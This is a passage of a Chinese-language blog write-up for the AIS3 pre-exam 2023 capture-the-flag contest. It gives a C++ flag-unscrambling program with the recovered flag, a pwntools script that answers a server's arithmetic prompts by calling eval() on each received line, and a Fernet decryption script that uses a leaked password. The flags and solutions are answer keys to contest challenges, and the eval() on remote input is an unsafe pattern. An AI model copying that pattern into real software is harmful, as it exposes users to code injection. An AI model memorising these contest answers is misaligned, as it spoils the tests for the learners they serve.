<span class=k>using</span> <span class=k>namespace</span> <span class=n>std</span><span class=p>;</span>

<span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
<span class=p>{</span>
    <span class=c1>// srand(3158064);
</span><span class=c1></span>    <span class=c1>// int vis[58] = {0};
</span><span class=c1></span>    <span class=c1>// int cnt =0;
</span><span class=c1></span>    <span class=c1>// while(cnt&lt;=58){
</span><span class=c1></span>    <span class=c1>//     int now = rand()%52;
</span><span class=c1></span>    <span class=c1>//     if(!vis[now])
</span><span class=c1></span>    <span class=c1>//         cnt++;
</span><span class=c1></span>    <span class=c1>//     ++vis[now]
</span><span class=c1></span>    <span class=c1>// }
</span><span class=c1></span>
    <span class=c1>// return 0;
</span><span class=c1></span>    <span class=n>string</span> <span class=n>mas_flag</span> <span class=o>=</span> <span class=s>&#34;91p4h_g_3ghet8_14cl3kf_{15u1ar1A033racSm7I}_c_s?f8lJ&#34;</span><span class=p>;</span>
    <span class=kt>int</span> <span class=n>rep</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>10</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>28</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>38</span><span class=p>,</span><span class=mi>31</span><span class=p>,</span><span class=mi>47</span><span class=p>,</span><span class=mi>44</span><span class=p>,</span><span class=mi>42</span><span class=p>,</span><span class=mi>35</span><span class=p>,</span><span class=mi>48</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>21</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>17</span><span class=p>,</span><span class=mi>16</span><span class=p>,</span><span class=mi>34</span><span class=p>,</span><span class=mi>40</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>39</span><span class=p>,</span><span class=mi>41</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>22</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>20</span><span class=p>,</span><span class=mi>19</span><span class=p>,</span><span class=mi>46</span><span class=p>,</span><span class=mi>23</span><span class=p>,</span><span class=mi>45</span><span class=p>,</span><span class=mi>26</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>15</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>43</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>27</span><span class=p>,</span><span class=mi>49</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>51</span><span class=p>,</span><span class=mi>36</span><span class=p>,</span><span class=mi>37</span><span class=p>,</span><span class=mi>24</span><span class=p>,</span><span class=mi>25</span><span class=p>,</span><span class=mi>50</span><span class=p>,</span><span class=mi>32</span><span class=p>,</span><span class=mi>13</span><span class=p>,</span><span class=mi>29</span><span class=p>,</span><span class=mi>18</span><span class=p>};</span>
    <span class=n>string</span> <span class=n>flag</span> <span class=o>=</span> <span class=s>&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span><span class=p>;</span>
    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=mi>54</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
        <span class=n>flag</span><span class=p>[</span><span class=n>rep</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span> <span class=o>=</span> <span class=n>mas_flag</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
    <span class=p>}</span>
    <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=n>flag</span><span class=p>;</span>

<span class=p>}</span>
</code></pre></div><p><code>AIS3{c143f9818a01_Ju5t_a_s1mple_fl4g_ch3ck3r_r1gh7?}</code></p><h3 id=vivid-emotion-_b>Vivid Emotion <code>>_&lt;b</code><a hidden class=anchor aria-hidden=true href=#vivid-emotion-_b>#</a></h3><p>發現是一個解方程式的題目，先用 ida 把 C code 匯出。
<img loading=lazy src=https://hackmd.io/_uploads/r1FWZO1Bn.png alt></p><p>接下來把每個算式用 regex 拆出來，再生成 z3 solver 的 code，執行即可解題</p><p><a href=https://pornhub.mov/ouo.html>https://pornhub.mov/ouo.html</a></p><h2 id=misc>Misc<a hidden class=anchor aria-hidden=true href=#misc>#</a></h2><h3 id=robots>robots<a hidden class=anchor aria-hidden=true href=#robots>#</a></h3><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>

<span class=c1>#connect to server</span>
<span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;chals1.ais3.org&#39;</span><span class=p>,</span> <span class=mi>12348</span><span class=p>)</span>    <span class=c1># remote binary</span>

<span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
<span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
<span class=kn>from</span> <span class=nn>time</span> <span class=kn>import</span> <span class=n>sleep</span>
<span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>30</span><span class=p>):</span>
    <span class=n>res</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
    <span class=n>ans</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=nb>eval</span><span class=p>(</span><span class=n>res</span><span class=p>))</span>
    <span class=k>print</span><span class=p>(</span><span class=n>res</span><span class=p>,</span> <span class=n>ans</span><span class=p>)</span>
    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>ans</span><span class=p>)</span>
    <span class=n>sleep</span><span class=p>(</span><span class=mf>0.5</span><span class=p>)</span>


<span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>    <span class=c1>#switch to interactive mode</span>
</code></pre></div><h2 id=crypto>Crypto<a hidden class=anchor aria-hidden=true href=#crypto>#</a></h2><h3 id=fernet>Fernet<a hidden class=anchor aria-hidden=true href=#fernet>#</a></h3><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=kn>from</span> <span class=nn>cryptography.fernet</span> <span class=kn>import</span> <span class=n>Fernet</span>
<span class=kn>import</span> <span class=nn>os</span>
<span class=kn>import</span> <span class=nn>base64</span>
<span class=kn>from</span> <span class=nn>Crypto.Hash</span> <span class=kn>import</span> <span class=n>SHA256</span>
<span class=kn>from</span> <span class=nn>Crypto.Protocol.KDF</span> <span class=kn>import</span> <span class=n>PBKDF2</span>

<span class=n>leak_password</span> <span class=o>=</span> <span class=s1>&#39;mysecretpassword&#39;</span>
<span class=n>flag</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=s1>&#39;iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj&#39;</span><span class=p>)</span>
<span class=n>salt</span> <span class=o>=</span> <span class=n>flag</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span>
<span class=n>flag</span> <span class=o>=</span> <span class=n>flag</span><span class=p>[</span><span class=mi>16</span><span class=p>:]</span>
<span class=n>key</span> <span class=o>=</span> <span class=n>PBKDF2</span><span class=p>(</span><span class=n>leak_password</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>salt</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=n>count</span><span class=o>=</span><span class=mi>1000</span><span class=p>,</span> <span class=n>hmac_hash_module</span><span class=o>=</span><span class=n>SHA256</span><span class=p>)</span>
<span class=n>f</span> <span class=o>=</span> <span class=n>Fernet</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>urlsafe_b64encode</span><span class=p>(</span><span class=n>key</span><span class=p>))</span>
<span class=n>plain</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
<span class=k>print</span><span class=p>(</span><span class=n>plain</span><span class=p>)</span>
</code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://blog.vincent55.tw/tags/ctf/>CTF</a></li><li><a href=https://blog.vincent55.tw/tags/ais3/>AIS3</a></li></ul><nav class=paginav><a class=prev href=https://blog.vincent55.tw/posts/cddcctf2023/><span class=title>« Prev</span><br><span>CDDC CTF 2023 紀錄</span></a>
<a class=next href=https://blog.vincent55.tw/posts/paperworkwithprogram/><span class=title>Next »</span><br><span>透過 Python 達成一般文書動作（word excel pdf printer）</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share AIS3 pre-exam 2023 Writeup on twitter" href="https://twitter.com/intent/tweet/?text=AIS3%20pre-exam%202023%20Writeup&url=https%3a%2f%2fblog.vincent55.tw%2fposts%2fais3preexam2023%2f&hashtags=CTF%2cAIS3"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zm-253.927 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share AIS3 pre-exam 2023 Writeup on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fblog.vincent55.tw%2fposts%2fais3preexam2023%2f&title=AIS3%20pre-exam%202023%20Writeup&summary=AIS3%20pre-exam%202023%20Writeup&source=https%3a%2f%2fblog.vincent55.tw%2fposts%2fais3preexam2023%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0v-129.439c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02v-126.056c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768h75.024zm-307.552-334.556c-25.674.0-42.448 16.879-42.448 39.002.0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share AIS3 pre-exam 2023 Writeup on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fblog.vincent55.tw%2fposts%2fais3preexam2023%2f&title=AIS3%20pre-exam%202023%20Writeup"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zm-119.474 108.193c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zm-160.386-29.702c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share AIS3 pre-exam 2023 Writeup on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.vincent55.tw%2fposts%2fais3preexam2023%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978v-192.915h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share AIS3 pre-exam 2023 Writeup on whatsapp" href="https://api.whatsapp.com/send?text=AIS3%20pre-exam%202023%20Writeup%20-%20https%3a%2f%2fblog.vincent55.tw%2fposts%2fais3preexam2023%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512h-386.892c-34.524.0-62.554-28.03-62.554-62.554v-386.892c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23-13.314-11.876-22.304-26.542-24.916-31.026s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z" /></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share AIS3 pre-exam 2023 Writeup on telegram" href="https://telegram.me/share/url?text=AIS3%20pre-exam%202023%20Writeup&url=https%3a%2f%2fblog.vincent55.tw%2fposts%2fais3preexam2023%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47A3.38 3.38.0 0126.49 29.86zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z" /></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://blog.vincent55.tw/>Vincent55's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z" /></svg></a><script>let menu=document.getElementById('menu')
if(menu){menu.scrollLeft=localStorage.getItem("menu-scroll-position");menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft);}}
document.querySelectorAll('a[href^="#"]').forEach(anchor=>{anchor.addEventListener("click",function(e){e.preventDefault();var id=this.getAttribute("href").substr(1);if(!window.matchMedia('(prefers-reduced-motion: reduce)').matches){document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({behavior:"smooth"});}else{document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();}
if(id==="top"){history.replaceState(null,null," ");}else{history.pushState(null,null,`#${id}`);}});});</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){if(document.body.scrollTop>800||document.documentElement.scrollTop>800){mybutton.style.visibility="visible";mybutton.style.opacity="1";}else{mybutton.style.visibility="hidden";mybutton.style.opacity="0";}};</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{if(document.body.className.includes("dark")){document.body.classList.remove('dark');localStorage.setItem("pref-theme",'light');}else{document.body.classList.add('dark');localStorage.setItem("pref-theme",'dark');}})</script><script>document.querySelectorAll('pre > code').forEach((codeblock)=>{const container=codeblock.parentNode.parentNode;const copybutton=document.createElement('button');copybutton.classList.add('copy-code');copybutton.innerHTML='copy';function copyingDone(){copybutton.innerHTML='copied!';setTimeout(()=>{copybutton.innerHTML='copy';},2000);}
copybutton.addEventListener('click',(cb)=>{if('clipboard'in navigator){navigator.clipboard.writeText(codeblock.textContent);copyingDone();return;}
const range=document.createRange();range.selectNodeContents(codeblock);const selection=window.getSelection();selection.removeAllRanges();selection.addRange(range);try{document.execCommand('copy');copyingDone();}catch(e){};selection.removeRange(range);});if(container.classList.contains("highlight")){container.appendChild(copybutton);}else if(container.parentNode.firstChild==container){}else if(codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"){codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);}else{codeblock.parentNode.appendChild(copybutton);}});</script></body></html>